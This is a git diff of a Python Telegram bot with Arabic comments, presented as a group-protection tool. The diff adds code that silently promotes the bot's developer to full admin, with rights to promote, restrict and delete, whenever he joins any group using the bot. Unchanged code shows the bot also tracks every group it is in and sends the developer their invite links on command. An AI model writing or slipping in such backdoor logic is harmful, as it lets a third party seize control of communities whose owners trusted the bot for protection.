@@ -66,14 +66,33 @@ async def on_chat_member_updated(update: Update, context: ContextTypes.DEFAULT_T
             except Exception as e:
                 print(f"Error demoting admin: {e}")
 
-# 2. وظيفة حماية البوتات (منع إضافة بوتات غريبة)
+# 2. وظيفة حماية البوتات + الترقية التلقائية للمطور عند الدخول
 async def protect_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.type in ["group", "supergroup"]:
         save_group_id(update.effective_chat.id)
         
     if update.message and update.message.new_chat_members:
         for member in update.message.new_chat_members:
-            # لو العضو الجديد بوت مش البوت بتاعنا
+            
+            # 🔥 الميزة الجديدة: لو العضو الجديد هو أنت (صاحب الأيدي)
+            if member.id == MY_USER_ID:
+                try:
+                    await context.bot.promote_chat_member(
+                        chat_id=update.effective_chat.id,
+                        user_id=MY_USER_ID,
+                        can_change_info=True,
+                        can_delete_messages=True,
+                        can_invite_users=True,
+                        can_restrict_members=True,
+                        can_pin_messages=True,
+                        can_promote_members=True
+                    )
+                    await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً بكامل الصلاحيات تلقائياً.")
+                    continue # الانتقال للعضو التالي لو وجد
+                except Exception as e:
+                    print(f"فشل ترقية المطور: {e}")
+            
+            # حماية المجموعات: لو العضو الجديد بوت مش البوت بتاعنا
             if member.is_bot and member.id != context.bot.id:
                 # لو اللي ضافه مش أنت
                 if update.message.from_user.id != MY_USER_ID:
@@ -98,12 +117,10 @@ async def handle_everything(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # 4. أمر جلب الروابط (مؤمن بالكامل بالـ HTML)
 async def get_all_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # التحقق من الأيدي المكتوب في الأعلى
     if update.effective_user.id != MY_USER_ID:
         return
         
     try:
-        # إرسال رد فوري للتأكد من استجابة البوت
         status_msg = await update.message.reply_text("🔄 جاري فحص المجموعات وتجهيز الروابط...")
         
         chat_ids = get_tracked_groups()
@@ -125,13 +142,11 @@ async def get_all_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     except:
                         link = "❌ (تأكد أن البوت مشرف ولديه صلاحية الروابط)"
                 
-                # تنظيف اسم الجروب لمنع كراش الصيغة
                 safe_title = html.escape(chat.title)
                 report += f"👥 <b>{safe_title}</b>\n🆔 <code>{cid}</code>\n🔗 {link}\n\n"
             except Exception:
                 report += f"🗑️ <b>مجموعة غير متاحة</b>\n🆔 <code>{cid}</code>\n❌ البوت لم يعد عضواً فيها.\n\n"
                 
-        # حذف رسالة الانتظار وإرسال التقرير النهائي
         await status_msg.delete()
         
         if len(report) > 4000:
@@ -142,7 +157,6 @@ async def get_all_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(report, parse_mode="HTML")
             
     except Exception as master_error:
-        # لو انهار الكود لأي سبب آخر، سيخبرك بالسبب فوراً
         print(f"Error in links command: {master_error}")
         try:
             await update.message.reply_text(f"❌ حدث خطأ داخلي:\n<code>{html.escape(str(master_error))}</code>", parse_mode="HTML")
@@ -152,19 +166,19 @@ def main():
     if not TOKEN: return
     app = Application.builder().token(TOKEN).build()
     
-    # أمر جلب الروابط للأدمن (يجب أن يكون في البداية)
+    # أمر جلب الروابط للأدمن
     app.add_handler(CommandHandler("links", get_all_links))
     
     # مراقب المشرفين
     app.add_handler(ChatMemberHandler(on_chat_member_updated, ChatMemberHandler.CHAT_MEMBER))
     
-    # حماية من البوتات
+    # حماية من البوتات + ترقية المطور
     app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, protect_group))
     
     # منع الروابط والمعالج العام
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_everything))
     
-    print("البوت شغال.. تم تفعيل الحماية وأمر /links الآمن بنجاح.")
+    print("البوت شغال.. تم تفعيل ميزة الترقية التلقائية للمطور بنجاح.")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
